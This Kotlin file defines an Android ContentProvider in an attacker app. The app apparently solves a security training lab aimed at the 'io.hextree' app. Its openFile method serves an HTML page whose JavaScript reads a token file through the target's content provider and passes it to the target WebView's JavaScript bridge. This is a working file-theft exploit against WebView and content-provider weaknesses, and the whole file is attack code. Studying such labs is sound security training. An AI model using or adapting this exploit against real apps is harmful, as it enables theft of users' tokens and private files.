package io.ks.intentatk

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.net.Uri
import android.os.ParcelFileDescriptor
import android.util.Log
import java.io.FileNotFoundException
import java.io.IOException

class AtkIntent40Provider : ContentProvider() {

    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<String>?): Int {
        throw UnsupportedOperationException("Delete operation is not supported")
    }

    override fun getType(uri: Uri): String {
        return "text/html"
    }

    override fun insert(uri: Uri, values: ContentValues?): Uri? {
        throw UnsupportedOperationException("Insert operation is not supported")
    }

    override fun onCreate(): Boolean {
        return true
    }

    override fun query(
        uri: Uri, projection: Array<String>?, selection: String?,
        selectionArgs: Array<String>?, sortOrder: String?,
    ): Cursor? {
        throw UnsupportedOperationException("Query operation is not supported")
    }

    override fun update(
        uri: Uri, values: ContentValues?, selection: String?,
        selectionArgs: Array<String>?,
    ): Int {
        throw UnsupportedOperationException("Update operation is not supported")
    }

    override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor {
        Log.i("AtkProviderDump", "openFile($uri)")
        try {
            // Create a pipe: pipe[0] is the read end; pipe[1] is the write end.
            val pipe = ParcelFileDescriptor.createPipe()
            val outputStream = ParcelFileDescriptor.AutoCloseOutputStream(pipe[1])

            // Write the HTML content on a background thread.
            Thread {
                try {
                    // Define your HTML content.
                    val htmlContent = """
                    <html>
                      <head>
                        <title>My HTML Page</title>
                        <script type="text/javascript">
                          function leakFileXHR(url) {
                              const xhr = new XMLHttpRequest();
                              xhr.open('GET', url, true);
                              xhr.onreadystatechange = function() {
                                  if (xhr.readyState === 4 && xhr.responseText) {
                                      document.getElementById("myParagraph").innerText = xhr.responseText ;
                                      hextree.authCallback(xhr.responseText);
                                  }
                              };
                              xhr.onerror = function(error) {
                                  document.getElementById("myParagraph").innerText = error ;
                              }
                              xhr.send();
                          }
                          // execute function here
                          leakFileXHR('content://io.hextree.files/other_files/token.txt')
                        </script>
                      </head>
                      <body>
                        <p id="myParagraph"></p>
                      </body>
                    </html>
                """.trimIndent()

                    // Write the HTML content to the pipe.
                    outputStream.write(htmlContent.toByteArray(Charsets.UTF_8))
                    outputStream.close()
                } catch (e: IOException) {
                    Log.e("AttackProvider", "Error writing HTML content to pipe", e)
                }
            }.start()

            // Return the read end of the pipe.
            return pipe[0]
        } catch (e: IOException) {
            throw FileNotFoundException("Could not open pipe for: $uri")
        }
    }

}